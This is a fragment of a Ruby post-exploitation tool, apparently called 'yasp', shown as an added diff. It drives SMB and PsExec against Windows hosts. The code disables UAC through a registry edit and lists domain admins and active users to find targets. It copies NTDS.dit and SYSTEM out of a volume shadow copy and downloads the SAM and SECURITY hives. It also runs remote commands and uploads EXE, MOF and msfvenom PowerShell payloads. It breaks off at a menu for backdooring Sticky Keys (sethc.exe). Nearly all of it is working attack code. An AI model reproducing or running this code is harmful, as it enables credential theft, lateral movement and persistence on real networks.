+  puts "[".light_blue + "*".white + "]".light_blue + " Checking if UAC is an issue....".white if verbose
+  cmd = "reg QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD"
+  begin
+    text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+    smb_psexec(cmdexec, false)
+    output = get_output(text, false)
+    files = [ text, bat ]
+    cleanup_after(files, false)
+    if output.to_s =~ /End of search: 0 match\(es\) found/im
+      puts "[".light_green + "*".white + "]".light_green + " UAC was not found on target!".white if verbose
+      return false
+    elsif output.to_s =~ /End of search: 1 match\(es\) found/im
+      v = output.to_s.split(' ')[-7]
+      if v == '0x1'
+        puts "[".light_red + "*".white + "]".light_red + " UAC is ENABLED!".white if verbose
+        return true
+      elsif v == '0x0'
+        puts "[".light_green + "*".white + "]".light_green + " UAC is DISABLED!".white if verbose
+        return false
+      else
+        puts "[".light_red + "*".white + "]".light_red + " UAC status seems to be unknown!".white if verbose
+        puts "[".light_red + "*".white + "]".light_red + " Lack of privileges to check registry or UAC doesn't exist!".white if verbose
+        return false
+      end
+    end
+  rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+    puts "[".light_blue + "*".white + "]".light_blue + " Error running commands to check UAC!".white if verbose
+    return false
+  end
+end
+
+# Disable UAC via Registry Edit
+def disable_uac(verbose=true)
+  if check_uac(verbose=false)
+    cmd="reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
+    begin
+      text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+      bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+      cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+      smb_psexec(cmdexec, false)
+      output = get_output(text, false)
+      files = [ text, bat ]
+      cleanup_after(files, false)
+      if check_uac(verbose=false)
+        puts "[".light_red + "*".white + "]".light_red + " UAC Doesn't apper to have been disabled!".white if verbose
+        puts "[".light_red + "*".white + "]".light_red + " Lack of privileges to check registry or Unknown factors at work.....".white if verbose
+        return false
+      else
+        puts "[".light_green + "*".white + "]".light_green + " UAC has been Disabled!".white if verbose
+        return true
+      end
+    rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+      puts "[".light_blue + "*".white + "]".light_blue + " Error running commands to check UAC!".white if verbose
+      return false
+    end
+  else
+    puts "UAC is not an issue, no need to disable....."
+    return true
+  end
+end
+
+# Re-Enable UAC via Registry Edit
+def enable_uac(verbose=true)
+  if check_uac(verbose=false)
+    puts "[".light_green + "*".white + "]".light_green + " UAC is already enabled, no need to re-enable anything....."
+    return true
+  else
+    cmd="reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f"
+    begin
+      text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+      bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+      cmdexec = "%COMSPEC% /C echo #{cmd2} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+      smb_psexec(cmdexec, false)
+      output = get_output(text, false)
+      files = [ text, bat ]
+      cleanup_after(files, false)
+      if check_uac(verbose=false)
+        puts "[".light_green + "*".white + "]".light_green + " UAC has been Re-Enabled!".white if verbose
+        return true
+      else
+        puts "[".light_red + "*".white + "]".light_red + " UAC Doesn't apper to have been disabled!".white if verbose
+        puts "[".light_red + "*".white + "]".light_red + " Lack of privileges to check registry or Unknown factors at work.....".white if verbose
+        return false
+      end
+    rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+      puts "[".light_blue + "*".white + "]".light_blue + " Error running commands to check UAC!".white if verbose
+      return false
+    end
+  end
+end
+
+# Leverage Tasklist command to check if other users are logged into the box
+# Help find Domain Admin or other Targeted Users
+# Returns an array of users, or nil
+def check_active_users(verbose=true)
+  users=[]
+  cmd = "tasklist /V /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\" /FO LIST"
+  begin
+    text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+    smb_psexec(cmdexec, false)
+    output = get_output(text, false)
+    files = [ text, bat ]
+    cleanup_after(files, false)
+    output.split("\n").each do |line|
+      if line =~ /User Name:    (.+\\.+)/
+        users << $1
+      end
+    end
+    users = users.uniq!
+    puts
+    return users
+  rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+    puts "[".light_blue + "*".white + "]".light_blue + " Error running commands to check actively logged in users!".white if verbose
+    return nil
+  end
+end
+
+# Check who is in the Domain & Enterprise Admin Groups
+# Returns an array of domain admin users or nil
+def check_domain_admin(verbose=true)
+  files=[]
+  users=[]
+  cmd1 = "net group \"Domain Admins\" /domain"
+  cmd2 = "net group \"Enterprise Admins\" /domain"
+  begin
+    text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{cmd1} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+    smb_psexec(cmdexec, false)
+    da_output = get_output(text, false)
+    files << text
+    files << bat
+    text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{cmd2} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+    smb_psexec(cmdexec, false)
+    ea_output = get_output(text, false)
+    files << text
+    files << bat
+    cleanup_after(files, false)
+    usr=false
+    da_output.split("\n").each do |line|
+      if usr
+        if not line =~ /The command completed successfully/i and not line.nil?  and not line == ''
+          line.split(' ').each {|user| users << user unless user.nil? or user == '' }
+        end
+      end
+      usr=true if line =~ /-{1,79}/
+    end
+    usr=false
+    ea_output.split("\n").each do |line|
+      if usr
+        if not line =~ /The command completed successfully/i and not line.nil?  and not line == ''
+          line.split(' ').each {|user| users << user unless user.nil? or user == '' }
+        end
+      end
+      usr=true if line =~ /-{1,79}/
+    end
+    users = users.uniq!
+    return users
+  rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+    puts "[".light_blue + "*".white + "]".light_blue + " Error running commands to check actively logged in users!".white if verbose
+    return nil
+  end
+end
+
+# Check if any Volume Shadow Copies already exist
+# Returns the array of existing copies (with path) or nil
+def check_vsc_existance(verbose=true)
+  vscopies=[]
+  cmd = "vssadmin list shadows"
+  begin
+    text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+    smb_psexec(cmdexec, false)
+    output = get_output(text, false)
+    files = [ text, bat ]
+    cleanup_after(files, false)
+    output.split("\n").each do |line|
+      if line =~ /No items found that satisfy the query/i
+        return nil
+      elsif line =~ /Shadow Copy Volume: (.+)/i
+        puts "[".light_green + "*".white + "]".light_green + " Found Existing Volume Shadow Copies:".white if verbose
+        puts output.to_s.cyan if verbose
+        vscopies << $1.chomp
+      end
+    end
+    vscopies = vscopies.uniq!
+    return vscopies
+  rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+    puts "[".light_red + "*".white + "]".light_red + " Error checking for existing Volume Shadow Copies!".white if verbose
+    puts "[".light_red + "*".white + "]".light_red + " Make sure you have enough privileges and that this is a Domain Controller.....".white if verbose
+    return nil
+  end
+end
+
+# Create Volume Shady Copy of requested drive
+# Used to snag NTDS.dit file from DC Servers
+def vsc_create(drive)
+  puts "[".light_blue + "*".white + "]".light_blue + " Creating New Volume Shady Copy from #{drive}".white
+  cmd="vssadmin create shadow /for=#{drive}:"
+  begin
+    text = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+    bat  = "#{@tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+    cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+#    cmdexec = "%COMSPEC% /C #{cmd} > #{text}"
+    smb_psexec(cmdexec, false)
+    puts "[".light_blue + "*".white + "]".light_blue + " taking short 30 second nap to ensure it has enough time....".white
+    sleep(30) # Need to provide sufficient time for this process to complete or your S.O.L.
+    output = get_output(text, false)
+    files = [ text, bat ]
+    cleanup_after(files, false)
+    if output =~ /Successfully created shadow copy/i
+      if output =~ /Shadow Copy ID: (.+)/i
+        id=$1.chomp
+      end
+      if output =~ /Shadow Copy Volume Name: (.+)/i
+        path=$1.chomp
+      end
+      if not id.nil? and not path.nil?
+        puts "[".light_green + "*".white + "]".light_green + " New Volume Shady Copy ID: #{id}".white
+        puts "[".light_green + "*".white + "]".light_green + " New Volume Shady Copy Location: #{path}".white
+        return id, path
+      else
+        return nil, nil
+      end
+    else
+      puts "[".light_red + "*".white + "]".light_red + " Error creating Volume Shadow Copy!".white
+      puts "[".light_red + "*".white + "]".light_red + " Make sure you have enough privileges and that this is a Domain Controller.....".white
+      return nil, nil
+    end
+  rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+    puts "[".light_red + "*".white + "]".light_red + " Error creating Volume Shadow Copy!".white
+    puts "[".light_red + "*".white + "]".light_red + " Make sure you have enough privileges and that this is a Domain Controller.....".white
+    return nil, nil
+  end
+end
+
+# General Usage for Main Menu (core_shell)
+def show_usage
+  puts
+  puts "Available Commands & General Usage:".white.underline
+  puts "  config".light_yellow + "             => ".white + "Configure Connection Credentials".light_yellow
+  puts "  os_scan".light_yellow + "            => ".white + "SMB OS Discovery Scan".light_yellow
+  puts "  cat [FILE]".light_yellow + "         => ".white + "Display Content of Local File".light_yellow
+  puts "  local".light_yellow + "              => ".white + "Drop to Local OS Shell to Execute Commands".light_yellow
+  puts "  rb [CODE]".light_yellow + "          => ".white + "Eval Ruby Code".light_yellow
+  if @working
+    puts
+    # Credentialed Options
+    puts "Authenticated Options:".white.underline
+    puts "  smbclient".light_yellow + "          => ".white + "Drop to Interactive SMBClient Shell Session".light_yellow
+    puts "  list".light_yellow + "               => ".white + "List Available Shares".light_yellow
+    puts "  use [SHARE]".light_yellow + "        => ".white + "Use Specified Share Name".light_yellow
+    puts "   ls [DIR]".light_yellow + "          => ".white + "List Directory Contents".light_yellow
+    puts "   dl [FILE]".light_yellow + "         => ".white + "Download Remote File".light_yellow
+    puts "   up [FILE] [DIR]".light_yellow + "   => ".white + "Upload File to Remote Directory".light_yellow
+    puts "   rm [FILE] [DIR]".light_yellow + "   => ".white + "Delete File in Remote Directory".light_yellow
+    puts "  mkdir [NAME] [DIR]".light_yellow + " => ".white + "Make New Directory in Remote Directory".light_yellow
+    puts "  rmdir [NAME] [DIR]".light_yellow + " => ".white + "Delete Remote Directory".light_yellow
+    puts
+    puts "PSEXEC Options:".white.underline
+    puts "  os_shell".light_yellow + "           => ".white + "OS Pseudo Shell - Execute Multiple Commands".light_yellow
+    puts "  os_exec".light_yellow + "            => ".white + "Execute Single OS Command on target".light_yellow
+    puts "  os_pshexec".light_yellow + "         => ".white + "Execute PowerShell Payload".light_yellow
+    puts "  up_exec".light_yellow + "            => ".white + "Upload & Execute EXE Payload".light_yellow
+    puts "  get_hives".light_yellow + "          => ".white + "Download Windows Registry Hives".light_yellow
+    puts "  get_ntds".light_yellow + "           => ".white + "Download Active Directory NTDS.dit File from DC".light_yellow
+    puts
+    puts "MOF Options:".white.underline
+    puts "  mof_exec".light_yellow + "           => ".white + "Execute Single OS Command on target".light_yellow
+    puts "  mof_up".light_yellow + "             => ".white + "Upload & Execute EXE Payload".light_yellow
+    puts
+    puts "Fun & Enumeration:".white.underline
+    puts "  swaparoo".light_yellow + "           => ".white + "Windows Swaparoo Setup & Repair".light_yellow
+    puts "  uac_check".light_yellow + "          => ".white + "Check if UAC is Enabled".light_yellow
+    puts "  disable_uac".light_yellow + "        => ".white + "Disable UAC via Registry Edits".light_yellow
+    puts "  enable_uac".light_yellow + "         => ".white + "Re-Enable UAC via Registry Edits".light_yellow
+    puts "  domain_admin".light_yellow + "       => ".white + "Get List of Domain Admin Users".light_yellow
+    puts "  active_users".light_yellow + "       => ".white + "Get List of Logged in Users".light_yellow
+    puts
+  end
+  puts
+  if not @working
+    puts "Use 'config' option to set & validate credentials to make more options available".light_yellow + "!".white
+    puts
+  end
+end
+
+
+# Our Pseudo Shell to serve as Main Menu
+# Perform actions based on user decision
+def core_shell
+  prompt = "(yasp)> "
+  while line = Readline.readline("#{prompt}", true)
+    cmd = line.chomp
+    case cmd
+    when /^clear|^cls|^banner/i
+      cls
+      banner
+      core_shell
+    when /^help|^ls$/i
+      show_usage
+      core_shell
+    when /^exit|^quit/i
+      puts
+      puts "OK, exiting yasp session".light_red + "....".white
+      puts
+      exit 69;
+    when /^config|^credentials/i
+      puts
+      cred_config
+      credentials = credz
+      if @working
+        puts "Target".light_green + ": #{credentials[0]}:#{credentials[1]}".white
+        puts "Hostname".light_green + ": #{credentials[6]}".white
+        puts "Domain".light_green + ": #{credentials[4]}".white unless credentials[4].nil?
+        puts "User".light_green + ": #{credentials[2]}".white
+        puts "Pass".light_green + ": #{credentials[3]}".white
+        puts "Pass is Hash".light_green + ": #{credentials[5].to_s.capitalize}"
+      end
+      puts
+      core_shell
+    when /^os.scan|^version.scan|^discovery.scan/i
+      puts
+      smb_os_discovery
+      puts
+      core_shell
+    when /^os.exec/i
+      puts
+      if @working
+        line = Readline.readline("(Command to Run)> ", true)
+        cmd = line.chomp
+        puts "Attempting to run command".light_blue + ": #{cmd}".white
+        smb_psexec(cmd)
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^os.pshexec$|^powershell$|^psh.payload$|^psh.exec$/i
+      puts
+      if @working
+        if File.exists?("#{MSFPATH}msfvenom")
+          power_shell_hell
+        else
+          puts "[".light_red + "*".white + "]".light_red + " Can't find MSFVENOM to build payloads!".white
+          puts "[".light_red + "*".white + "]".light_red + " Check or provide MSF Path in source to correct and enable this option......".white
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^os.shell/i
+      puts
+      if @working
+        if @tmp.nil?
+          # Failed to find out %TEMP%, ask user for writable location...
+          puts "Provide a writable location for temporary storage, like".light_yellow + ": C:\\\\\\\\WINDOWS\\\\Temp".white
+          line = Readline.readline("(Temp Path to use)> ", true)
+          tmp = line.chomp
+        else
+          tmp=@tmp
+        end
+        puts puts "[".light_blue + "*".white + "]".light_blue + " Dropping to pseudo shell.....".white
+        cls
+        banner
+        prompt = "(PSEXEC Shell)> "
+        while line = Readline.readline("#{prompt}", true)
+          cmd = line.chomp
+          text = "#{tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+          bat  = "#{tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+          case cmd
+          when /^exit$|^quit$|^back$/i
+            puts
+            puts "OK, Returning to Main Menu".light_red + "....".white
+            break
+          else
+            begin
+              cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+              smb_psexec(cmdexec, false)
+              get_output(text, true)
+              files = [ text.gsub('\\', '\\\\'), bat.gsub('\\', '\\\\') ]
+              cleanup_after(files, false)
+            rescue Errno::ENOENT => e
+              puts "#{e}".light_red
+            rescue => e
+              puts "#{e}".light_red
+            end
+          end
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^up.exec/i
+      puts
+      if @working
+        while(true)
+          line = Readline.readline("(Local File to Upload)> ", true)
+          lfile = line.chomp
+          if File.exists?(lfile)
+            break
+          else
+            puts
+            puts "Can't find file".light_red + "!".white
+            puts "Check path or permissions and try again".light_red + ".....".white
+            puts
+          end
+        end
+        ldir = lfile.split('/')[0..-2].join('/') + '/'
+        fname = lfile.split('/')[-1]
+        line = Readline.readline("(Remote Path to Upload to)> ", true)
+        rdir = line.chomp.sub('C:', '').sub('c:', '')
+
+        # Smbclient looks for file uploads in current dir so we temporarily change
+        Dir.chdir(ldir) do
+          if @smbclient.smb_upload(fname, rdir)
+            puts "[".light_green + "*".white + "]".light_green + "#{lfile} has been uploaded to #{rdir}#{fname}"
+          else
+            puts
+            puts "Returning to main menu due to error with upload".light_red + "....".white
+            puts
+            core_shell
+          end
+        end
+        puts "Attempting to run service payload now".light_blue + ".....".white
+        smb_psexec(rdir + fname)
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^get.hives$|^key.hives$|^registry.download$|^dl.reg$/i
+      puts
+      if @working
+        if @tmp.nil?
+          # Failed to find out %TEMP%, ask user for writable location...
+          puts "We will first need to backup registry to location on remote target".light_yellow + ".....".white
+          puts "Provide a writable location for temporary storage, like".light_yellow + ": C:\\\\\\\\WINDOWS\\\\Temp".white
+          line = Readline.readline("(Temp Path to use for Backups)> ", true)
+          tmp = line.chomp
+        else
+          tmp=@tmp
+        end
+        make_reg_backups(tmp)
+        sleep(5) # Dramatic pause and to avoid issues running to quickly (had some minor issues which this pause seemed to resolve)
+        download_hives([tmp.gsub('\\', '\\\\') +"\\\\sys", tmp.gsub('\\', '\\\\') + "\\\\sec", tmp.gsub('\\', '\\\\') + "\\\\sam", tmp.gsub('\\', '\\\\') + "\\\\sw" ])
+        cleanup_after([tmp.gsub('\\', '\\\\') +"\\\\sys", tmp.gsub('\\', '\\\\') + "\\\\sec", tmp.gsub('\\', '\\\\') + "\\\\sam", tmp.gsub('\\', '\\\\') + "\\\\sw"])
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^get.ntds$|^dl.ntds$|^ntds.download$/i
+      if @working
+        if @tmp.nil?
+          # Failed to find out %TEMP%, ask user for writable location...
+          puts "Provide a writable location for temporary storage, like".light_yellow + ": C:\\\\\\\\WINDOWS\\\\Temp".white
+          line = Readline.readline("(Temp Path to use for Backups)> ", true)
+          tmp = line.chomp
+        else
+          tmp=@tmp
+        end
+        line = Readline.readline("(Drive Letter Containing NTDS)> ", true)
+        drive = line[0]
+        id, path = vsc_create(drive)
+        if not id.nil? and not path.nil?
+          begin
+            cmd1 = "%COMSPEC% /C copy /Y \"#{path}\\WINDOWS\\NTDS\\NTDS.dit\" #{@tmp}\\NTDS.dit"
+            cmd2 = "%COMSPEC% /C copy /Y \"#{path}\\WINDOWS\\System32\\config\\SYSTEM\" #{@tmp}\\SYSTEM"
+            smb_psexec(cmd1, false)
+            sleep(3)
+            smb_psexec(cmd2, false)
+            sleep(3)
+            hives=[ "#{@tmp}\\NTDS.dit", "#{@tmp}\\SYSTEM" ]
+            download_hives(hives)
+            puts "[".light_blue + "*".white + "]".light_blue + " Removing created Volume Shadow Copy....".white
+            cmd = "%COMSPEC% /C vssadmin delete shadows /Shadow=#{id}"
+            smb_psexec(cmd1, false)
+            sleep(3)
+            cleanup_after(hives, false)
+            puts
+          rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+            puts "[".light_red + "*".white + "]".light_red + " Error copying Volume Shadow Copy to Temp location!".white if verbose
+          end
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^list.shadows$/i
+      if @working
+        vsc = check_vsc_existance
+        if vsc.nil?
+          puts "[".light_blue + "*".white + "]".light_blue + " No Existing Volume Shadow Copies Found....".white
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^mof.exec/i
+      puts
+      if @working
+        line = Readline.readline("(Command to Run)> ", true)
+        cmd = line.chomp
+        puts "Attempting to run command".light_blue + ": #{cmd}".white
+        mof = generate_cmd_mof(cmd)
+        rdir = "C:\\windows\\system32\\wbem\\mof"
+        fname=HOME + '/payloads/' + randz(10) + '.mof'
+        lfile = File.open(fname, 'w+')
+        ldir=fname.split('/')[0..-2].join('/')
+        lfile.write(mof)
+        lfile.close
+        Dir.chdir(ldir) do
+          if @smbclient.smb_upload(fname.split('/')[-1], 'windows\\\\system32\\\\wbem\\\\mof')
+            puts "[".light_green + "*".white + "]".light_green + " File uploaded to #{rdir}\\#{fname.split('/')[-1]}".white
+          end
+        end
+        File.delete(fname) if File.exists?(fname) and not File.directory?(fname)
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^mof.up/i
+      puts
+      if @working
+        while(true)
+          line = Readline.readline("(Local EXE File to Upload)> ", true)
+          lfile = line.chomp
+          if File.exists?(lfile)
+            break
+          else
+            puts
+            puts "Can't find file".light_red + "!".white
+            puts "Check path or permissions and try again".light_red + ".....".white
+            puts
+          end
+        end
+        ldir = lfile.split('/')[0..-2].join('/') + '/'
+        fname = lfile.split('/')[-1]
+        rdir = "C:\\windows\\system32"
+        Dir.chdir(ldir) do
+          if @smbclient.smb_upload(fname, 'windows\\\\system32')
+            puts "[".light_green + "*".white + "]".light_green + "#{lfile} has been uploaded to #{rdir}\\#{fname}"
+          else
+            puts
+            puts "Returning to main menu due to error with upload".light_red + "....".white
+            puts
+            core_shell
+          end
+        end
+        puts "[".light_blue + "*".white + "]".light_blue + " Uploading MOF Paylod now to trigger running of #{lfile}".white
+        rdir = "C:\\windows\\system32\\wbem\\mof"
+        mof_name = randz(10) + ".mof"
+        mof = generate_exe_mof(mof_name, fname)
+        mof_payload = HOME + '/payloads/' + mof_name
+        f=File.open(mof_payload, 'w+')
+        f.puts mof
+        f.close
+        ldir=mof_payload.split('/')[0..-2].join('/')
+        Dir.chdir(ldir) do 
+          if @smbclient.smb_upload(mof_name, 'windows\\\\system32\\\\wbem\\\\mof')
+            puts "[".light_green + "*".white + "]".light_green + " File uploaded to #{rdir}\\#{mof_name}".white
+            puts "[".light_green + "*".white + "]".light_green + " Your payload should be triggered soon...........".white
+          end
+        end
+        File.delete(mof_payload) if File.exists?(mof_payload) and not File.directory?(mof_payload)
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      puts
+      core_shell
+    when /^smbclient$|^smbshell$|^smb.shell$/i
+      puts
+      if @working
+        puts "[".light_blue + "*".white + "]".light_blue + " Dropping to interactive smbclient SMB Shell...."
+        @smbclient.smb_shell
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^ls (.+)/i
+      rdir=$1.chomp
+      if @working
+        output = @smbclient.smb_cmd('ls', rdir.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+        if output.nil?
+          puts "[".light_red + "*".white + "]".light_red + " Unable to Fetch Directory Listing for: #{rdir}".white
+        else
+          puts output[1..-1].join.to_s.cyan
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^dl (.+)/i
+      rfile=$1.strip.chomp
+      if @working
+        if rfile =~ /\\/
+          lfile = rfile.split('\\')[-1]
+        else
+          lfile = rfile.split('/')[-1]
+        end
+        puts "[".light_blue + "*".white + "]".light_blue + " Attempting to Download: #{rfile}".white
+        Dir.mkdir(RESULTS + @target + '/') unless File.exists?(RESULTS + @target + '/') and File.directory?(RESULTS + @target + '/')
+        Dir.chdir(RESULTS + @target + '/') do 
+          if @smbclient.smb_download(rfile.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'), lfile)
+            if File.exists?(lfile)
+              puts "[".light_green + "*".white + "]".light_green + " Successfully downloaded #{rfile} to #{RESULTS + @target}/#{lfile}".white
+            else
+              puts "[".light_red + "*".white + "]".light_red + " File should have been downloaded, I dont know what happened......?".white
+            end
+          end
+        end
+        puts
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^up (.+) (.+)/i
+      lfile=$1
+      rdir=$2.strip.chomp
+      if @working
+        ldir=lfile.split('/')[0..-2].join('/')
+        Dir.chdir(ldir) do 
+          if @smbclient.smb_upload(lfile.split('/')[-1], rdir.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+            puts "[".light_green + "*".white + "]".light_green + " File uploaded to #{rdir}\\#{lfile.split('/')[-1]}".white
+          end
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^cat (.+)/i
+      lfile=$1.strip.chomp
+      puts
+      if File.exists?(lfile) and not File.directory?(lfile)
+        data = File.open(lfile).read
+        puts data.to_s.cyan
+      else
+        puts "Can't Display #{lfile}".light_red + "!".white
+        puts "Check path or permissions and try again".light_red + ".....".white
+      end
+      puts
+      puts
+      core_shell
+    when /^mkdir (.+) (.+)/i
+      dir_name=$1
+      rdir=$2.strip.chomp
+      if @working
+        if @smbclient.smb_mkdir(dir_name, rdir.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+            puts "[".light_green + "*".white + "]".light_green + " #{rdir}\\\\#{dir_name}\\\\ has been Created!".white
+        else
+            puts "[".light_red + "*".white + "]".light_red + " Problem trying to create remote directory!".white
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^rmdir (.+) (.+)/i
+      dir_name=$1
+      rdir=$2.strip.chomp
+      if @working
+        if @smbclient.smb_rmdir(dir_name, rdir.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+            puts "[".light_green + "*".white + "]".light_green + " #{rdir}\\\\#{dir_name}\\\\ has been Deleted!".white
+        else
+            puts "[".light_red + "*".white + "]".light_red + " Problem trying to delete remote directory!".white
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^rm (.+) (.+)/i
+      fname=$1
+      rdir=$2.strip.chomp
+      if @working
+        if @smbclient.smb_rm(fname, rdir.sub('c:\\\\', '').sub('c:\\', '').sub('C:', '').sub('c:', '').gsub('\\\\', '\\'))
+            puts "[".light_green + "*".white + "]".light_green + " #{rdir}\\\\#{fname} has been Deleted!".white
+        else
+            puts "[".light_red + "*".white + "]".light_red + " Problem trying to delete remote file!".white
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^list$|^list.shares$/i
+      if @working
+        output = @smbclient.list_shares_credentialed
+        if not output.nil? and output != ''
+          count=0
+          output.each do |line|
+            if line =~ /Server\s+Comment/
+              puts
+              puts line.chomp.cyan
+            else
+              if count.to_i == 0
+                puts "[".light_green + "*".white + "]".light_green + " Available Shares: ".white
+                count = count.to_i + 1
+              else
+                puts line.chomp.to_s.cyan
+              end
+            end
+          end
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^use (.+)/i
+      share=$1.strip.chomp
+      if @working
+        puts "[".light_yellow + "*".white + "]".light_yellow + " Changing Connected Share to: #{share}".white
+        @smbclient = RubySmbClient.new(@target,@port.to_i, share, @user,@pass,@domain, @hashpass)
+        @smbshare=share
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^swaparo/i
+      if @working
+        if @tmp.nil?
+          # Failed to find out %TEMP%, ask user for writable location...
+          puts "Provide a writable location for temporary storage, like".light_yellow + ": C:\\\\\\\\WINDOWS\\\\Temp".white
+          line = Readline.readline("(Temp Path to use)> ", true)
+          tmp = line.chomp
+        else
+          tmp=@tmp
+        end
+        puts
+        # This is a little something I cooked up with my friend Osanda Malith 
+	# He wrote the original batch script which I then ported to a Meterpreter script
+        # Swap out and replace key binaries available via login screens
+        # allows you to swap cmd.exe with SYSTEM shell to these default locations
+        # Includes swap and repair for sethc.exe and utilman.exe methods
+        # Requires Admin Privs since files are in System32 directory.....
+        puts "Windows Swaparoo Menu".light_yellow
+        puts
+        while(true)
+          puts "Select Today's Usage".light_yellow + ": ".white
+          puts "1) ".white + "Backdoor Sticky Keys Prompt (sethc.exe)".light_yellow
